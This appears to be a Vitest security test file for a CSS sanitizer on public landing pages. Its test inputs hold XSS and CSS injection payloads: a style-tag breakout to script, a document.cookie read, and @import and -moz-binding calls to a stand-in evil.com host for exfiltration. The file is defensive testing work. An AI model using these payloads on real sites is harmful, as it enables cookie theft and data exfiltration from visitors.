/**
 * Public Page Renderer Security Tests
 *
 * Validates CSS sanitization to prevent XSS attacks via custom CSS.
 * Critical because landing pages are publicly accessible and contain
 * sensitive customer call recording data (even scrubbed).
 */

import { describe, it, expect } from "vitest";
import { sanitizeCustomCss } from "./public-page-renderer.js";

describe("sanitizeCustomCss", () => {
  it("should return null for null input", () => {
    expect(sanitizeCustomCss(null)).toBeNull();
  });

  it("should allow safe CSS properties", () => {
    const css = `
      .callout { background-color: #f0f0f0; border-radius: 8px; }
      h1 { color: #333; font-size: 2em; }
    `;
    const result = sanitizeCustomCss(css);
    expect(result).toContain("background-color: #f0f0f0");
    expect(result).toContain("color: #333");
  });

  it("should remove </style> tag injection attempts", () => {
    const css = "body { color: red; } </style><script>alert('XSS')</script><style>";
    const result = sanitizeCustomCss(css);
    expect(result).not.toContain("</style>");
    expect(result).not.toContain("<script>");
  });

  it("should remove <script> tags", () => {
    const css = '<script>document.cookie</script> body { color: red; }';
    const result = sanitizeCustomCss(css);
    expect(result).not.toContain("<script>");
    expect(result).toContain("body { color: red; }");
  });

  it("should remove @import rules (data exfiltration)", () => {
    const css = "@import url('https://evil.com/steal.css'); body { color: red; }";
    const result = sanitizeCustomCss(css);
    expect(result).not.toContain("@import");
    expect(result).not.toContain("evil.com");
    expect(result).toContain("body { color: red; }");
  });

  it("should remove javascript: URLs", () => {
    const css = "div { background: url(javascript:alert(1)); }";
    const result = sanitizeCustomCss(css);
    expect(result).not.toContain("javascript:");
  });

  it("should remove CSS expression() (IE exploits)", () => {
    const css = "div { width: expression(alert('XSS')); }";
    const result = sanitizeCustomCss(css);
    expect(result).not.toContain("expression(");
  });

  it("should remove -moz-binding (Firefox XBL injection)", () => {
    const css = "div { -moz-binding: url('https://evil.com/xbl.xml'); }";
    const result = sanitizeCustomCss(css);
    expect(result).not.toContain("-moz-binding:");
  });

  it("should remove behavior: (IE HTC injection)", () => {
    const css = "div { behavior: url('malicious.htc'); }";
    const result = sanitizeCustomCss(css);
    expect(result).not.toContain("behavior:");
  });

  it("should remove data: URIs in url()", () => {
    const css =
      "div { background-image: url(data:text/html,<script>alert(1)</script>); }";
    const result = sanitizeCustomCss(css);
    expect(result).not.toMatch(/url\s*\(\s*["']?\s*data:/i);
  });

  it("should handle case variations", () => {
    const css = '@IMPORT url("evil.css"); JAVASCRIPT:alert(1); EXPRESSION(alert(1))';
    const result = sanitizeCustomCss(css);
    expect(result).not.toContain("IMPORT");
    expect(result).not.toContain("JAVASCRIPT");
    expect(result).not.toContain("EXPRESSION");
  });

  it("should handle multiple injection vectors in one CSS string", () => {
    const css = `
      @import url("evil.css");
      div { background: url(javascript:alert(1)); }
      </style><script>document.cookie</script><style>
      p { width: expression(alert(1)); }
      span { -moz-binding: url("xbl.xml"); }
    `;
    const result = sanitizeCustomCss(css);
    expect(result).not.toContain("@import");
    expect(result).not.toContain("javascript:");
    expect(result).not.toContain("</style>");
    expect(result).not.toContain("<script>");
    expect(result).not.toContain("expression(");
    expect(result).not.toContain("-moz-binding:");
  });
});
